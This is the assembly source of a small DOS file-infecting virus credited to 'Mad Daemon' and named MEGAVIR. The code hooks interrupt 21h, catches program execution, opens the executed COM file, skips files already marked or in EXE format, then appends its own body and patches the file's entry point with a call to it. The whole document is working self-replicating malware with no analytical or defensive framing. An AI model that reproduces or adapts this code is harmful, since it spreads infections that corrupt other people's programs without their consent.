
ideal
p386
model tiny
codeseg
startupcode

n_int=len/4+82h

;MEGAVIR by Mad Daemon @ http://hysteria.sk/maddaemon/

;Expected values in registers at entry point: bx=0 ch=0
;Compile to COM

       call    start
old_3: int     20h
       nop
start: pop     di
       dec     di
       dec     di
       mov     si,[di]
       dec     di
       push    di
       add     si,di
       movsw
       movsb
       shl     di,1
       mov     es,bx
       cmpsb
       je      in_m
       dec     si
       dec     di
       mov     cl,len
       rep
       movsb

       mov     ax,OFFSET int21+100h
       cwde
       xchg    eax,[es:84h]
       stosd
in_m:  push    ds
       pop     es
       retn

call0: mov     ax,4000h
call1: push    ax
       int     21h
       pop     ax
       mov     ah,42h
       cwd
call2: xor     cx,cx
       int     21h
       mov     cl,3
       mov     si,203h
       mov     dx,si
       retn

int21: cmp     ax,4B00h
       jne     noinf
       pusha
       push    ds

       mov     ax,3D02h
       call    call2
       xchg    bx,ax
       jc      fail
       push    cs
       pop     ds
       mov     ax,3F02h

       call    call1
       xchg    bp,ax
       mov     cl,len+3

       lodsb
       cmp     al,'M'
       je      close
       cmp     al,0E8h
       je      close

       call    call0

       mov     [BYTE si],0E8h
       mov     [WORD si+1],bp
       call    call0

close: mov     ah,3Eh
       int     21h
fail:  pop     ds
       popa
noinf: ;rept    ($-start+1) mod 4
       ;db      90h
       ;endm
       db      0EAh

len=$-start
end